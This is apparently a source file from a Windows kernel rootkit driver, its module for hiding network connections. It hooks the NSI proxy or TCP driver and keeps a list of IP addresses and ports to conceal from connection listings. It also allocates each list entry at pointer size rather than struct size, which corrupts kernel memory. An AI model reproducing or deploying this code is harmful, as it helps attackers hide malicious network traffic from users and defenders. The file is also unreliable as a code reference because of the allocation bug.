#include "Network.h"
#include "Ioctl.h"
#include "Debug.h"
#include "Ip2string.h"
#include "NsiProxyNetworkHook.h"
#include "TcpDriverNetworkHook.h"

typedef struct _NET_CONNECTION_ENTRY* PNET_CONNECTION_ENTRY;

typedef struct _NET_CONNECTION_ENTRY {
	AUTOCHK_HIDDEN_CONNECTION Connection;
	PNET_CONNECTION_ENTRY NextEntry;
} NET_CONNECTION_ENTRY, * PNET_CONNECTION_ENTRY;


PNET_CONNECTION_ENTRY g_NetworkLinkedListHead = NULL;
PNET_CONNECTION_ENTRY g_NetworkLinkedListTail = NULL;

NTSTATUS NetInitializeConnectionHider()
{

	NTSTATUS Status;
	D_INFO("Initializing Connection Hider..");
	
	Status = NetHookNsiProxy();

	if (!NT_SUCCESS(Status))
	{
		Status = NetHookTcpDriver();
	}

	if (NT_SUCCESS(Status))
	{
		Status = STATUS_SUCCESS;
	}
	
	return Status;
}

VOID NetAddHiddenConnection(PAUTOCHK_HIDDEN_CONNECTION NewConnection)
{
	if (g_NetworkLinkedListHead != NULL)
	{
		PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;

		while (CurrentEntry != NULL)
		{
			if (CurrentEntry->Connection.IpAddress == NewConnection->IpAddress && 
				CurrentEntry->Connection.Port == NewConnection->Port && 
				CurrentEntry->Connection._Unknown == NewConnection->_Unknown)
			{
				D_INFO("Connection Already Exists");
				return;
			}

			CurrentEntry = CurrentEntry->NextEntry;
		}
	}

	PNET_CONNECTION_ENTRY NewEntry = ExAllocatePool(NonPagedPool, sizeof(PNET_CONNECTION_ENTRY));

	if (!NewEntry)
	{
		D_ERROR("ExAllocatePool Failed: Could not allocate NET_CONNECTION_ENTRY");
		return;
	}

	NewEntry->Connection = *NewConnection;

	if (!g_NetworkLinkedListHead)
	{
		NewEntry->NextEntry = NULL;
		g_NetworkLinkedListHead = NewEntry;
		g_NetworkLinkedListTail = NewEntry;
	}
	else
	{
		NewEntry->NextEntry = NULL;
		g_NetworkLinkedListTail->NextEntry = NewEntry;
		g_NetworkLinkedListTail = NewEntry;
	}

	D_INFO_ARGS("Address %d Added Successfully!", NewEntry->Connection.IpAddress);
}


BOOLEAN NetIsHiddenIpAddress(ULONG IpAddress)
{
	PNET_CONNECTION_ENTRY CurrentEntry = g_NetworkLinkedListHead;

	while (CurrentEntry != NULL)
	{
		if (CurrentEntry->Connection.IpAddress == IpAddress)
		{
			return TRUE;
		}

		CurrentEntry = CurrentEntry->NextEntry;
	}

	return FALSE;
}


VOID NetFreeConnectionHider()
{
	if (!NetNsiFreeHook())
	{
		NetFreeTcpDriver();
	}

	while (g_NetworkLinkedListHead)
	{
		PNET_CONNECTION_ENTRY TempPtr = g_NetworkLinkedListHead->NextEntry;

		ExFreePool(g_NetworkLinkedListHead);

		g_NetworkLinkedListHead = TempPtr;
	}

	g_NetworkLinkedListHead = NULL;
	g_NetworkLinkedListTail = NULL;
}

